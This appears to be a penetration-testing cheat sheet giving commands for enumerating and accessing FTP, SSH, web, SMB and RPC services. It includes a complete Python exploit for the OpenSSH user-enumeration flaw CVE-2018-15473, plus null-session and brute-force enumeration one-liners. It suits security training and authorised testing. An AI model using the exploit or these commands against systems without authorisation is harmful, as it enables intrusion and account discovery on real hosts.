# Network Services

## FTP

#### Anonymous login

{% code overflow="wrap" %}
```bash
ftp anonymous@10.10.10.10  # No password needed
```
{% endcode %}

#### Auto login

```bash
sshpass -p 'pass' ftp user@10.10.10.10
```

#### Browser URL

{% code overflow="wrap" %}
```bash
ftp://user:pass@10.10.10.10
```
{% endcode %}

#### SSL

{% code overflow="wrap" %}
```bash
lftp 10.10.10.10 -e "set ssl:verify-certificate no; set ftp:ssl-force true"
```
{% endcode %}

#### Download all files

{% code overflow="wrap" %}
```bash
wget -r --user='user' --password='pass' ftp://10.10.10.10
```
{% endcode %}

## SSH

#### Default credentials

Check for default credentials depending on the vendor:[https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh#default-credentials](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh#default-credentials)

#### Auto login

```
sshpass -p 'pass' ssh user@10.10.10.10
```

#### Private key login

{% code overflow="wrap" %}
```bash
ssh -i id_rsa user@10.10.10.10
```
{% endcode %}

#### Important files

```
ssh_config
sshd_config
authorized_keys
ssh_known_hosts
known_hosts
id_rsa
```

#### Generate RSA keys

{% code overflow="wrap" %}
```bash
ssh-keygen -t rsa -f id_rsa
```
{% endcode %}

#### User enumeration - OpenSSH <7.7

Any version of OpenSSH up to 7.7 is vulnerable to user enumeration (CVE-2018-15473) if not patched. To exploit this vulnerability, we can use the following script:

<details>

<summary><mark style="background-color:green;">ssh_user_enum.py</mark></summary>

{% code overflow="wrap" fullWidth="true" %}
```python
#!/usr/bin/env python2

import argparse
import logging
import paramiko
import socket
import sys
from colorama import init, Fore
from threading import Thread, current_thread, enumerate as enumerate_threads

class SSHUserChecker:
    def __init__(self, target, port=22):
        self.target = target
        self.port = port

        # Remove paramiko logging
        logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

        # Assign functions to respective handlers
        self._old_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
        paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = self._service_accept
        paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = self._invalid_username

    def _service_accept(self, *args, **kwargs):
        paramiko.message.Message.add_boolean = self._add_boolean
        return self._old_service_accept(*args, **kwargs)

    def _add_boolean(self, *args, **kwargs):
        pass

    def _invalid_username(self, *args, **kwargs):
        raise InvalidUsername()

    def check_user(self, username):
        sock = socket.socket()
        sock.connect((self.target, self.port))
        transport = paramiko.transport.Transport(sock)

        try:
            transport.start_client()
        except paramiko.ssh_exception.SSHException:
            print (Fore.RED + '\n[!] Failed to negotiate SSH transport for user:' + username)
            return False

        try:
            transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
        except InvalidUsername:
            return False
        except paramiko.ssh_exception.AuthenticationException:
            return True
        return False

class InvalidUsername(Exception):
    pass

def check_user_wrapper(user_checker, username, valid_users, invalid_users):
    if user_checker.check_user(username):
        valid_users.append(username)
    else:
        invalid_users.append(username)

def main():
    parser = argparse.ArgumentParser(description='SSH User Enumeration')
    parser.add_argument('-u', '--username', help="Username to check for validity.")
    parser.add_argument('-w', '--wordlist', help="Wordlist file containing usernames to check.")
    parser.add_argument('-p', '--port', type=int, default=22, help="Set port of SSH service")
    parser.add_argument('target', help="IP address of the target system")

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()

    user_checker = SSHUserChecker(args.target, args.port)
    valid_users = []
    invalid_users = []

    if args.wordlist:
        with open(args.wordlist, 'r') as f:
            for line in f:
                username = line.strip()
                t = Thread(target=check_user_wrapper, args=(user_checker, username, valid_users, invalid_users))
                t.start()
    else:
        if not args.username:
            parser.error("[!] You must specify either a username (-u) or a wordlist (-w).")
        else:
            t = Thread(target=check_user_wrapper, args=(user_checker, args.username, valid_users, invalid_users))
            t.start()

    # Esperar a que todos los hilos terminen
    for t in enumerate_threads():
        if t != current_thread():
            t.join()

    if args.wordlist:
        if valid_users:
            print(Fore.GREEN + "\n[+] Valid users:")
            for user in valid_users:
                print(Fore.GREEN + "{}".format(user))
        else:
            print(Fore.RED + "\n[-] No valid users found.")
    else:
        if valid_users:
            print(Fore.GREEN + "\n[+] Valid user: {}".format(args.username))
        else:
            print(Fore.RED + "\n[-] Invalid user: {}".format(args.username))

if __name__ == "__main__":
    main()
```
{% endcode %}

</details>

## HTTP/HTTPS

Enumerate basic files and directories with nmap scripts

```bash
nmap -p80,443 --script http-enum -oN webScan <target>
```

#### Web Technologies

```
whatweb <target>
```

I also recommend using the [`Wappalizer`](https://www.wappalyzer.com/apps/) browser extension

#### File and Directory Enumeration

* **Gobuster**

```bash
gobuster dir -u http://<target>/ -w <wordlist>
```

{% hint style="info" %}
Useful parameters:

`-t, --threads                       Concurrent threads`

`--exclude-length                    Exclude content length`

`-s, --status-codes                  White list status codes`

`-b, --status-codes-blacklist        Black list status codes`

`-r, --follow-redirect               Follow redirects`

`--proxy                             Use Proxy <type:host:port>`

`-k, --no-tls-validation             Skip TLS verification`

`--timeout                           HTTP Timeout`
{% endhint %}

* **Wfuzz**

```bash
wfuzz -w <wordlist> http://<target>/FUZZ
```

{% hint style="info" %}
Useful parameters:

`-t <threads>      Concurrent threads`

`-L, --follow      Follow redirects`

`-p                Use Proxy <host:port:type>`

`--hc/hl/hw/hh     Hide code/lines/words/chars`

`--sc/sl/sw/sh     Show code/lines/words/chars`
{% endhint %}

#### Subdomain Enumeration

* **Gobuster**

```
gobuster vhost -u http://<target>/ -w <wordlist>
```

* **Wfuzz**

```
wfuzz -H 'Host: FUZZ.<target>' -w <wordlist> http://<target>/
```

#### Exploitation

Once the web is enumerated, you may want to exploit some web vulnerabilities:

{% content-ref url="web-vulnerabilities/" %}
[web-vulnerabilities](web-vulnerabilities/)
{% endcontent-ref %}

## SMB

System enumeration with `enum4linux`

```bash
enum4linux -a [-u '<username>' -p '<password>'] <target>
```

#### Shares Enumeration

{% hint style="info" %}
On windows systems you may need to escape backlashes: `\\\\<target>\\<share>`
{% endhint %}

```bash
# null session
smbclient -N -L //<target>
# authenticated
smbclient -U 'username[%password]' -L //<target>
# conect to a share
smbclient [-U 'username[%password]'] //<target>/<share>
```

```bash
# null session
smbmap -H <target>
# authenticated
smbmap -u "username" -p "password" -H <target>
# recursive/non-recursive listing
smbmap [-u "username" -p "password"] -R/-r <share> -H <target>
```

```bash
# null session
crackmapexec smb <IP> -u '' -p '' --shares
# authenticated
crackmapexec smb <IP> -u 'username' -p 'password' --shares
```

```bash
nmap -p 139,445 --script "smb-enum-shares" <target>
```

## RPC

#### Automated Enumeration

```bash
rpcdump.py <target>
```

#### Manual Enumeration

```bash
# null session
rpcclient -U "" -N <target>
# authenticated
rpcclient -U 'username%passwd' -N <target>
# commands https://www.hackingarticles.in/active-directory-enumeration-rpcclient/
rpcclient -U '[username%passwd]' -N <target> -c '<command>'
```
